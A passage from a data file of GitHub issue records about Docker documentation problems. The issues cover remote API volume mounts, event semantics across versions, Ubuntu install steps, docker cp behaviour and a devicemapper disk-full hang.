1.10.3\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   20f81dd\n Built:        Thu Mar 10 21:49:11 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 1\nServer Version: 1.10.3\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 2\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins:\n Volume: local\n Network: bridge null host\nKernel Version: 4.1.19-boot2docker\nOperating System: Boot2Docker 1.10.3 (TCL 6.4.1); master : 625117e - Thu Mar 10 22:09:02 UTC 2016\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 996.1 MiB\nName: 1.10\nID: XS37:USGK:BVPL:4KKK:K6HN:EMVM:43DG:W2CY:JFO3:I6KX:OITN:E5F2\nDebug mode (server): true\n File Descriptors: 10\n Goroutines: 21\n System Time: 2016-03-19T01:28:14.590797867Z\n EventsListeners: 0\n Init SHA1:\n Init Path: /usr/local/bin/docker\n Docker Root Dir: /mnt/sda1/var/lib/docker\nLabels:\n provider=virtualbox\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nVirtualBox\n\n**Steps to reproduce the issue:**\n1. Look up remote API docs to create a container (for example, [API version 1.22](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.22/#create-a-container)).\n2. Issue a `curl` call to create a container with mounts.\n\n```\n$ curl -XPOST -H 'Content-Type: application/json' http://${docker}/containers/create?name=foo -d '{\"Image\": \"busybox\", \"Mounts\": [{ \"Destination\": \"/foo\" }]}'\n```\n1. Inspect the container. See that no `Mounts` were created.\n\n```\n$ curl http://${docker}/containers/foo/json | jq '.Mounts'\n[]\n```\n1. Ignore the docs, search on the issues, find #15908, specifically [this comment](https://github.com/docker/docker/issues/15908#issuecomment-137749134).\n2. Create a container using the undocumented `Volumes` key.\n\n```\n$ curl -XPOST -H 'Content-Type: application/json' http://${docker}/containers/create?name=foo -d '{\"Image\": \"busybox\", \"Volumes\": { \"/foo\": {}}}'\n```\n1. Inspect the container. See that `Mounts` were created.\n\n```\n$ curl http://${docker}/containers/foo/json | jq '.Mounts'\n[  \n    {\n        \"Name\": \"ee6a4252b747356d74e71c952401420af00dbfc704b9d560000dec0df5ea095b\",\n        \"Source\": \"/mnt/sda1/var/lib/docker/volumes/ee6a4252b747356d74e71c952401420af00dbfc704b9d560000dec0df5ea095b/_data\",\n        \"Destination\": \"/foo\",\n        \"Driver\": \"local\",\n        \"Mode\": \"\",\n        \"RW\": true,\n        \"Propagation\": \"\"\n    }\n]\n```\n\n**Describe the results you received:**\nRemote API docs describe an incorrect way to create a container with volumes. And the correct way is inconsistent in that the deprecated `\"Volumes\"` key must be used to create containers with volumes, but the newer `\"Mounts\"` key is used to deliver information on a container inspect.\n\n**Describe the results you expected:**\nEither the Remote API docs would correctly describe how to create a container with volumes, or the actual API would be fixed to be consistent between creating/inspecting.\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nThe example in the docs is incorrect in every version going back to when the `Mounts` key was introduced in API 1.20.\n"},{"labels":["documentation",null,null],"text":"For Docker 1.11, containerd integration (https://github.com/docker/docker/pull/20662)\nonly brings a minimum amount of user-facing changes.\n\nThere _are_ some changes that need to be documented. This is a first inventory\nof those changes (more changes may follow).\n## ~~Installation from binaries~~\n\n~~Docker Engine no longer is a single binary, and requires 4 binaries to run;\n(docker, containerd, containerd-shim, runc).~~\n\n~~We need to update the \"installation from binaries\" documentation;\nhttps://docs.docker.com/engine/installation/binaries/~~\n\naddressed in https://github.com/docker/docker/pull/21994\n## ~~New daemon flag~~\n\nThere is a new `--containerd=` option in the daemon that needs to be documented;\n- https://github.com/docker/docker/blob/master/docs/reference/commandline/daemon.md\n- https://github.com/docker/docker/blob/master/man/docker-daemon.8.md\n\nThis was resolved in https://github.com/docker/docker/pull/21576\n## ~~Changes in \"privileged\" containers~~\n\n~~There is a change with `--privileged` and restricted readonly paths. In docker 1.10\nthere are no restrictions, in 1.11 restrictions are applied but because the user is\nprivileged they can revert them inside container.~~\n\nFor reference; https://github.com/docker/docker/blob/e6573a5d18c3045fb021668f3c7539ffa52696fe/daemon/execdriver/native/template/default_template_linux.go#L86-L98\n\n(resolved by https://github.com/docker/docker/pull/21751)\n## ~~Systemd groups~~\n\n~~This is still being worked on, but there's a chance that systemd cgroups won't\nwork in the initial release, so `--exec-opt native.cgroupdriver=systemd` cannot \nbe used.~~\n\n~~If systemd cgroups are not supported, this should be documented. ~~\n\n(resolved in https://github.com/docker/docker/pull/21592)\n## Experimental features\n\nSlight user facing change is that in case of a daemon crash, containers will\nnot die but we will still shut them down on start. In experimental we will\nleave them running and reattach upon daemon start.\n\n(currently blocked on https://github.com/docker/docker/issues/21933, we can add documentation\nfor the experimental features once those are resolved)\n## ~~Controlling the containerd daemon~~\n\n~~t.b.d.; the docker daemon automatically takes care of starting/stopping the\ncontainerd daemon. Do we need to describe how to start/stop (and configure?) \nthe containerd daemon manually?~~\n\nno changes needed for the regular installation, and binary installation is\nupdated in https://github.com/docker/docker/pull/21994\n## Overview of binaries and their role\n\nt.b.d.; provide an overview of the binaries that are installed, and what their\nrole is.\n## Packagers documentation\n\nhttps://github.com/docker/docker/blob/master/project/PACKAGERS.md\n## Contributors guide\n\nhttps://github.com/docker/opensource/tree/master/docs\n"},{"labels":["documentation",null],"text":"Hello,\n\nIt looks like the documentation for [events](https://docs.docker.com/engine/reference/api/docker_remote_api/#docker-events) has become out of date, in particular around the `kill` event.  Prior to Docker 1.7.0, the `kill` event was only emitted on `SIGKILL` being sent to the container via `docker kill`.  Since 1.7.0, the semantic changed and the `kill` event started to be emitted on any signal sent via `docker kill`, and since 1.8.0 the semantic changed again and the `kill` event started to be emitted for any signal sent at all (including `SIGTERM` and `SIGKILL` sent as part of `docker stop`).  These changes in behavior led to a [bug](https://github.com/aws/amazon-ecs-agent/issues/335) with the Amazon ECS Agent, which we will be correcting with our next release.\n\nHere's the set of behavior changes I've found across different Docker versions:\n\n| Docker version | `docker kill -s USR1` | `docker kill` | `docker stop` | Container exit |\n| --- | --- | --- | --- | --- |\n| 1.5.0 | no event | `die`, `kill` | `die`, `stop` | `die` |\n| 1.6.0 | no event | `die`, `kill` | `die`, `stop` | `die` |\n| 1.6.1 | no event | `die`, `kill` | `die`, `stop` | `die` |\n| 1.6.2 | no event | `die`, `kill` | `die`, `stop` | `die` |\n| 1.7.0 | `kill` | `die`, `kill` | `die`, `stop` | `die` |\n| 1.7.1 | `kill` | `die`, `kill` | `die`, `stop` | `die` |\n| 1.8.0 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.8.1 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.8.2 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.8.3 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.9.0 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.9.1 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.10.0 | `kill`* | `kill`, `die`* | `kill`, `kill`, `die`, `stop`* | `die`* |\n| 1.10.1 | `kill`* | `kill`, `die`* | `kill`, `kill`, `die`, `stop`* | `die`* |\n| 1.10.2 | `kill`* | `kill`, `die`* | `kill`, `kill`, `die`, `stop`* | `die`* |\n| 1.10.3 | `kill`* | `kill`, `die`* | `kill`, `kill`, `die`, `stop`* | `die`* |\n\n\\* These events are now typed with `container`.  Other events are emitted with type `network` and `volume`.\n\nNote that `kill` is emitted under many more circumstances in recent versions of Docker, and that the ordering of `die`, `kill` changed to `kill`, `die` with Docker 1.8.0 as well.  The [available](https://docs.docker.com/engine/reference/commandline/events/) [documentation](https://docs.docker.com/engine/reference/api/docker_remote_api/#docker-events) for events is fairly light as a whole, but the [event diagram](https://docs.docker.com/engine/reference/api/images/event_state.png) has been out of date at least since 1.7.0.\n\nIt would be fantastic if the semantics of the different events were documented and any semantic changes were called out in the changelog for releases.\n\nThanks!\nSam\n"},{"labels":["documentation",null,null,null],"text":"Is there anything similar to the flowcharts on https://docs.docker.com/engine/extend/authorization/ for the volume plugin API?\n\nI am trying to write a simple volume plugin for some internal use cases and it would be nice to see a visual of what requests will be called for the relevant CLI/API commands.\n\nFor instance the first time I started testing my plugin I was surprised by the number of Path requests before/after other operations. Based on the documentation I assumed it would have only been used with docker inspect type commands.\n"},{"labels":["documentation",null],"text":"I've gone through a few Docker installs on Ubuntu both myself as well as with some new developers on my team.  I've noticed a fairly consistent series of missed steps or mistakes that keep happening during each setup.  This is not because the document is incomplete, but because the necessary steps are spread out and hidden amongst other **optional** steps.\n\nhttps://github.com/docker/docker/blob/master/docs/installation/linux/ubuntulinux.md\n\nIt would be nice if the following steps were put at the top of the instructions and noted as a \"typical\" flow for installation:\n\n---\n1. Add the new `GPG` key.\n   \n   ```\n   sudo apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D\n   ```\n2. Add an entry for your Ubuntu operating system to `/etc/apt/sources.list.d/docker.list`\n   - On Ubuntu Precise 12.04 (LTS)\n         `deb https://apt.dockerproject.org/repo ubuntu-precise main`\n   - On Ubuntu Trusty 14.04 (LTS)\n         `deb https://apt.dockerproject.org/repo ubuntu-trusty main`\n   - Ubuntu Wily 15.10\n         `deb https://apt.dockerproject.org/repo ubuntu-wily main`\n   - Ubuntu Wily 16.04\n         `deb https://apt.dockerproject.org/repo ubuntu-xenial main`\n3. Update the `APT` package index.\n   \n   ```\n   sudo apt-get update\n   ```\n4. Install Docker\n   \n   ```\n   sudo apt-get install docker-engine\n   ```\n5. Add your user to the `docker` group\n   \n   ```\n   sudo usermod -aG docker ubuntu\n   ```\n   ---\n\nThis series of steps is sufficient for the majority of the installations that happen.  While it's fine to keep the extended information - as it's helpful - burying the important parts has required me to assist every person I've instructed to install docker.\n\nIt's worth noting I think given the number of steps needed to install the Ubuntu package, would it not make sense for Docker to publish an official PPA?  Much of this would be mitigated by just doing that.\n"},{"labels":["documentation",null,null],"text":"> Whenever possible, use current Official Repositories as the basis for your image. We recommend the Debian image since it’s very tightly controlled and kept extremely minimal (currently under 100 mb), while still being a full distribution.\n\nThe docs suggest that the Debian image is under 100 mb. While this may have been true at some time point in the past, it's incorrect at present. https://github.com/docker-library/docs/blob/master/debian/tag-details.md#debianlatest suggests that the size is around 125 mb now - for latest and jessie.\n"},{"labels":["documentation"],"text":"I am trying to follow this guide https://docs.docker.com/engine/security/certificates/, but the paths are for linux. What would be the equivalent for Windows?\n"},{"labels":["documentation"],"text":"After #19953 closes, the volume documentation should be updated to account for the changes wherever we talk about anonymous volumes.\n"},{"labels":["documentation"],"text":"Create overview/parent pages for the engine sub commands `docker-volume` and `docker-network`.  Needed and necessary in the `/man` and `/docs` directory.  See #20190 \n"},{"labels":["documentation"],"text":"Reported by @jpetazzo\n\nIf I pass an invalid sequence --detach-keys just accepts it without showing an error (and silently reverts to `^P^Q`) also, I don't think that `[a-Z]` is a valid glob entry. I'm not sure exactly what the doc should say since I don't know what the code should do; but it needs more explanation IMHO For example:\n\n`--detach-keys ctrl-d,d` \n\nworks, but not \n\n`ctrl-D,d` or `CTRL-d,d`\n\nThere is one confusing thing -- the `--detach-keys` can be a global engine option, but when it is used for `docker run` or `docker attach` it is a local, non-sticky option (i.e. if I docker run `--detach-keys ctrl-x` then detach then reattach, it default to `^P^Q` again)\n"},{"labels":["documentation",null,null],"text":"This is with reference to https://github.com/docker/docker/issues/20827. But, that thread is already closed and is not getting traction. Can we open that thread or discuss the issue here?\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nOutput of `docker version`:\n\n```\nDocker version 1.8.0, build 0d03096\n```\n\nOutput of `docker info`:\n\n```\nContainers: 1\nImages: 5\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 21\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.1.18-boot2docker\nOperating System: Boot2Docker 1.10.2 (TCL 6.4.1); master : 611be10 - Mon Feb 22 22:47:06 UTC 2016\nCPUs: 8\nTotal Memory: 1.955 GiB\nName: boot2docker\nID: PVUD:7SAK:UKCM:SWAM:VO4D:HAVW:WJWE:L7J6:OKOY:EHOE:EOMP:ED3Y\nDebug mode (server): true\nFile Descriptors: 11\nGoroutines: 29\nSystem Time: 2016-03-03T17:42:38.217741179Z\nEventsListeners: 0\nInit SHA1: \nInit Path: /usr/local/bin/docker\nDocker Root Dir: /mnt/sda1/var/lib/docker\n```\n\nProvide additional environment details (AWS, VirtualBox, physical, etc.):\nMacOS X\n\nList the steps to reproduce the issue:\n1. Create a docker image with a file at `/app/build/version.txt`\n2. Start a container for that image with\n`CONTAINER_ID=$(docker create foo:123)`\n3. Attempt to copy the file out of the container to a path that doesn't exist with\n`docker cp ${CONTAINER_ID}:/app/build/version.txt build/version.txt`\n--> `lstat /path/to/working/directory/build: no such file or directory`\n4. Try again with just a destination directory with\n`docker cp ${CONTAINER_ID}:/app/build/version.txt build/`\n--> `no such directory`\n5. Create the directory with\n`mkdir build`\n6. Try again with either command.\n--> Notice success.\n\nDescribe the results you received:\n\n`no such file or directory`\n`no such directory`\n\nDescribe the results you expected:\n\nSuccessful copy of the file.\n\nProvide additional info you think is important:\nThe documentation [here](https://docs.docker.com/engine/reference/commandline/cp/) is very explicit about the expected behavior in this situation.  In particular, `SRC_PATH` specifies a file and `DEST_PATH` does not exist, so the file should be created at `DEST_PATH`.  The documentation implies that the directory structure leading up to `DEST_PATH` will be created if necessary.\n"},{"labels":["documentation",null],"text":"I have a local Ubuntu 12.04 machine that I want to run Docker on with some application code. However the code needs to read data off of a USB drive when it is plugged in. Because the drive can be swapped, it seems like volume mounting it does not work when the new one is plugged in. Is there a way to configure Docker so that the usb detection is passed to Docker instead of just the host os? \n\nUse docker run command and discussed here:\n\nhttps://docs.docker.com/engine/reference/run/#volume-shared-filesystems\n\nYou can mount /dev using the -v flag.  Any device that appears on /dev will show up in the container.  If you do this, you'll likely also want to change the cgroup value to restrict the permissions to just the USB device.\n\nJerome in our company also wrote this blog on doing this:\n\nhttps://jpetazzo.github.io/2015/01/13/docker-mount-dynamic-volumes/\n"},{"labels":[null,"documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nOutput of `docker version`:\n\n```\nClient:\n Version:      1.10.2\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   c3959b1\n Built:        Mon Feb 22 16:22:08 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.10.2\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   c3959b1\n Built:        Mon Feb 22 16:22:08 2016\n OS/Arch:      linux/amd64\n```\n\nOutput of `docker info`:\n\n```\nContainers: 24\n Running: 2\n Paused: 0\n Stopped: 22\nImages: 308\nServer Version: 1.10.2\nStorage Driver: devicemapper\n Pool Name: docker-253:2-413393-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: ext4\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 10.48 GB\n Data Space Total: 107.4 GB\n Data Space Available: 26.63 GB\n Metadata Space Used: 15.14 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.132 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Either use `--storage-opt dm.thinpooldev` or use `--storage-opt dm.no_warn_on_loop_devices=true` to suppress this warning.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.93 (2015-01-30)\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins: \n Volume: local\n Network: host bridge null\nKernel Version: 4.3.4-200.fc22.x86_64\nOperating System: Fedora 22 (Twenty Two)\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 7.721 GiB\nName: tomas-dohnalek.brno.seznam.cz\nID: L3SZ:VAVV:WVWH:K37D:QTXP:A3QC:J3LU:OANJ:25A7:J2AR:OYHA:RWEF\nUsername: dohnto\nRegistry: https://index.docker.io/v1/\n```\n\nList the steps to reproduce the issue:\n1. Follow the documentation: (https://docs.docker.com/engine/reference/commandline/pull/ - `docker pull registry.hub.docker.com/debian` or https://github.com/docker/docker/blob/master/man/docker-pull.1.md - `docker pull registry.hub.docker.com/fedora:20`)\n2. Run `docker pull registry.hub.docker.com/debian`\n\nDescribe the results you received:\nThe actual output is  `Error response from daemon: Error parsing HTTP response: invalid character '<' looking for beginning of value: \"\\n\\n\\n<!DOCTYPE html><!....404: The page you were looking for is not here...`\n\nDescribe the results you expected:\nPull the image\n\nProvide additional info you think is important:\n**When I use docker 1.9.1 everything works as expected.**\n"},{"labels":["documentation",null,null,null],"text":"After adding the apt repository according to https://docs.docker.com/engine/installation/linux/ubuntulinux/ instructions, it fails to fetch Docker. There is nothing in the documentation to suggest that ppc64le is not supported in this setup.\n\nW: Failed to fetch https://apt.dockerproject.org/repo/dists/ubuntu-wily/Release  Unable to find expected entry 'main/binary-ppc64el/Packages' in Release file (Wrong sources.list entry or malformed file)\n\nE: Some index files failed to download. They have been ignored, or old ones used instead.\n"},{"labels":[null,"documentation",null,null,null],"text":"When I tried running `docker build --tag Trevor:FlaskCompose`, I received an exception:\n\n> invalid value \"Trevor:FlaskCompose\" for flag --tag: Error parsing reference: \"Trevor:FlaskCompose\" is not a valid repository/tag\n> See 'docker build --help'.\n\nUnfortunately, when running `docker build --help`, as suggested by the tool, there is no additional guidance provided.\n\n> -t, --tag=[]                    Name and optionally a tag in the 'name:tag' format\n\nHow does a user know what a valid \"tag\" is? I fiddled with the name, and apparently the `name` must be all lowercase, and the `tag` portion can have capital letters. However, I am not aware of what the other requirements are.\n\nThe less friction, and more clarity, that is provided by Docker, the more likely users will be to adopt it and be delighted by the experience of working with it. :smile: \n\nCheers,\nTrevor Sullivan\nMicrosoft MVP: PowerShell\n"},{"labels":["documentation",null,null],"text":"https://bugzilla.redhat.com/show_bug.cgi?id=1304808\n\nOutput of `docker version`:\nClient:\n Version:      1.8.2-el7\n API version:  1.20\n Package Version: docker-1.8.2-10.el7.x86_64\n Go version:   go1.4.2\n Git commit:   a01dc02/1.8.2\n Built:  \n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.8.2-el7\n API version:  1.20\n Package Version: \n Go version:   go1.4.2\n Git commit:   a01dc02/1.8.2\n Built:  \n OS/Arch:      linux/amd64\n\nList the steps to reproduce the issue:\n1. docker images --all | tail -n +1 | wc -l\n2. docker info | grep 'Images'\n\nProvide additional info you think is important:\nDiscussions around this issue:\n\n---\n\nWhen you do `docker info` SystemInfo (https://github.com/docker/docker/blob/master/daemon/info.go#L26) method is called, which gets the images count from imageStore.\n\ndaemon.imageStore.Map()\nhttps://github.com/docker/docker/blob/master/daemon/info.go#L72\n\nThis map returns information about the images. (Tags are not part of this store).\nHence when you do `docker images --all|wc -l` you see a different count as tags are also included in the output.\n\nHope that clears up the confusion.\n\nShishir\n\n---\n\nFROM: Chris Evich\nOkay, just checked.  The man-page for 'docker info' is in need of some love.  Clarifying the 'Images' and 'Containers' count with what they actually represent would be 'nice to have'.  On F22, it has this blurb:\n\nThis  command  displays  system  wide information regarding the Docker installation. Information displayed includes the number of containers and images, pool name,  data file,  metadata file, data space used, total data space, metadata space used , total metadata space, execution driver, and the kernel version.\n\nand the example section is really out of date (OS: Ubuntu 14 and Kernel 3.13).  Would make the guys in marketing happier if it showed Fedora/CentOS/RHEL instead and maybe showed the typical devicemapper details instead of aufs (not used any more, anywhere IIRC).\n\nHere's a suggestion for the description blurb:\n\nThis  command  displays  system  wide information regarding the Docker installation. Information displayed includes the number of containers and (non-tagged) images, pool name,  image storage details, space available and used, execution driver, OS and the kernel versions.\n\n---\n"},{"labels":["documentation",null,null],"text":"The docker remote API documentation pages (f.ex. [Remote API v.1.22](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.22/#get-container-logs)) describe how to connect and retrieve container logs, but does not describe _how_ the log messages are formatted. I expect to be able to understand what to do with the data I get back.\n\nFrom what I am able to tell, the log results is a sequence of chunks (I am unsure if these are separated by newline or not, but this seems to be the case). Each chunk seems to be on the format (`fd`, `chunk length`, `contents`). `fd` is a single (1) byte telling you from which file descriptor (1 for stdout, and 2 for stderr) the chunk is from. Next follows `chunk length`, which is 7 bytes telling you how long the length of the log chunk. The length does not include the `fd` field or the `chunk lenght` fields, only the contents. Finally, the contents follow.\n\nThis is, however, a result of look-and-guess based only on enabling stdin and stderr. I have no clue what would happen if I enable timestamps, if I only read data from a single source, or if I even use the right terminology here.\n\nIt would be much easier to use logs fetched via the remote API if this is properly documented.\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nOutput of `docker version`:\n\n```\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5/1.9.1\n Built:        \n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5/1.9.1\n Built:        \n OS/Arch:      linux/amd64\n\n```\n\nOutput of `docker info` (on a fresh host; an affected host does not respond to `docker info`):\n\n```\nContainers: 1\nImages: 6\nServer Version: 1.9.1\nStorage Driver: devicemapper\n Pool Name: docker-docker--pool\n Pool Blocksize: 524.3 kB\n Base Device Size: 107.4 GB\n Backing Filesystem: xfs\n Data file: \n Metadata file: \n Data Space Used: 100.7 MB\n Data Space Total: 9.437 GB\n Data Space Available: 9.337 GB\n Metadata Space Used: 77.82 kB\n Metadata Space Total: 25.17 MB\n Metadata Space Available: 25.09 MB\n Udev Sync Supported: true\n Deferred Removal Enabled: true\n Deferred Deletion Enabled: true\n Deferred Deleted Device Count: 0\n Library Version: 1.02.93-RHEL7 (2015-01-28)\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.1.17-22.30.amzn1.x86_64\nOperating System: Amazon Linux AMI 2015.09\nCPUs: 1\nTotal Memory: 995.6 MiB\nName: ip-172-31-34-29\nID: GO67:QAUR:ZN7D:LBC6:M366:GT2C:BQTV:F3UE:IMGD:YFNF:T37L:OQWC\n\n```\n\nProvide additional environment details (AWS, VirtualBox, physical, etc.): Amazon Linux AMI 2015.09.2 configured with a second EBS volume at /dev/xvdb and configured with direct LVM (using devicemapper) by `docker-storage-setup`.  By default, `docker-storage-setup` configures the thin pool originally sized at 40% of the available disk with an auto-extend policy, however the same behavior is exhibited when auto-extend is disabled and when `lv_when_full` is changed to `error`.\n\nList the steps to reproduce the issue:\n1. Configure Docker as described above (direct LVM with devicemapper using xfs)\n2. Run containers to progressively consume disk (I seemed to have reasonable results using `docker run ubuntu dd if=/dev/urandom of=sample.txt bs=64M count=1 iflag=fullblock`) until the disk is full (alternately, run my [repro script](https://gist.github.com/samuelkarp/6c8b5ebc0a9cc34006c8))\n3. Try to do something with Docker (any of `docker ps`, `docker info`, `docker run`, `docker stop`, `docker rm`, `docker images`, `docker rmi`)\n\nDescribe the results you received:\nDocker commands hang indefinitely.  dmesg fills with things like the following:\n\n```\n[ 3029.535199] device-mapper: thin: 253:2: reached low water mark for data device: sending event.\n[ 3029.589706] device-mapper: thin: 253:2: switching pool to out-of-data-space mode\n[ 3037.584626] vethac84d34: renamed from eth0\n[ 3037.588339] docker0: port 2(vethd9e484d) entered disabled state\n[ 3037.622172] docker0: port 2(vethd9e484d) entered disabled state\n[ 3037.626293] device vethd9e484d left promiscuous mode\n[ 3037.629420] docker0: port 2(vethd9e484d) entered disabled state\n[ 3089.592091] device-mapper: thin: 253:2: switching pool to read-only mode\n[ 3089.598147] Buffer I/O error on dev dm-4, logical block 144077, lost async page write\n[ 3089.603304] Buffer I/O error on dev dm-4, logical block 144078, lost async page write\n[ 3089.608669] Buffer I/O error on dev dm-4, logical block 144079, lost async page write\n[ 3089.614565] Buffer I/O error on dev dm-4, logical block 144080, lost async page write\n[ 3089.620112] Buffer I/O error on dev dm-4, logical block 144081, lost async page write\n[ 3089.624919] Buffer I/O error on dev dm-4, logical block 144082, lost async page write\n[ 3089.633141] Buffer I/O error on dev dm-4, logical block 144083, lost async page write\n[ 3089.638389] Buffer I/O error on dev dm-4, logical block 144084, lost async page write\n[ 3089.645177] Buffer I/O error on dev dm-4, logical block 144085, lost async page write\n[ 3089.650294] Buffer I/O error on dev dm-4, logical block 144086, lost async page write\n[ 3089.664084] XFS (dm-4): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n[ 3089.684777] XFS (dm-5): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n[ 3089.695953] XFS (dm-4): Unmounting Filesystem\n[ 3089.703478] XFS (dm-4): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n[ 3089.710627] XFS (dm-5): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n...\n[ 3150.336222] XFS (dm-6): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n[ 3240.180102] INFO: task docker:3312 blocked for more than 120 seconds.\n[ 3240.184544]       Tainted: G            E   4.1.17-22.30.amzn1.x86_64 #1\n[ 3240.189691] \"echo 0 > /proc/sys/kernel/hung_task_timeout_secs\" disables this message.\n[ 3240.195639] docker          D ffff880037d03d48     0  3312      1 0x00000000\n[ 3240.200654]  ffff880037d03d48 ffff88003e321980 ffff88003745b300 0000000000000246\n[ 3240.206939]  ffff880037d04000 ffff88003d6aabe0 ffff880037e6cdc0 ffff880037e6cde8\n[ 3240.212569]  ffff880037e6cd90 ffff880037d03d68 ffffffff814df3e7 ffff88003d6aabe0\n[ 3240.218299] Call Trace:\n[ 3240.219963]  [<ffffffff814df3e7>] schedule+0x37/0x90\n[ 3240.223179]  [<ffffffffa048fb79>] xfs_ail_push_all_sync+0xa9/0xe0 [xfs]\n[ 3240.227811]  [<ffffffff810aafc0>] ? prepare_to_wait_event+0x110/0x110\n[ 3240.233513]  [<ffffffffa047b2e9>] xfs_unmountfs+0x59/0x170 [xfs]\n[ 3240.239390]  [<ffffffffa047bdab>] ? xfs_mru_cache_destroy+0x6b/0x90 [xfs]\n[ 3240.247251]  [<ffffffffa047dd36>] xfs_fs_put_super+0x36/0x90 [xfs]\n[ 3240.252770]  [<ffffffff811ccb06>] generic_shutdown_super+0x76/0x100\n[ 3240.256723]  [<ffffffff811ccea7>] kill_block_super+0x27/0x70\n[ 3240.260913]  [<ffffffff811cd1b9>] deactivate_locked_super+0x49/0x80\n[ 3240.265629]  [<ffffffff811cd7ae>] deactivate_super+0x4e/0x70\n[ 3240.269797]  [<ffffffff811e9a63>] cleanup_mnt+0x43/0x90\n[ 3240.274904]  [<ffffffff811e9b02>] __cleanup_mnt+0x12/0x20\n[ 3240.279970]  [<ffffffff81085b97>] task_work_run+0xb7/0xf0\n[ 3240.284063]  [<ffffffff81013bb1>] do_notify_resume+0x51/0x80\n[ 3240.288751]  [<ffffffff814e35bc>] int_signal+0x12/0x17\n```\n\nDescribe the results you expected:\nDocker itself would continue to be responsive, but operations that consume space (pulling images, writing inside a container, etc) would fail.  This is the behavior observed when I switch to ext4 instead of xfs.\n"},{"labels":["documentation",null],"text":"PR #17034 Added the capability to specify per volume mount propagation mode. This added the shared/slave/private options to the `--volume` option.\n\nAs was mentioned in 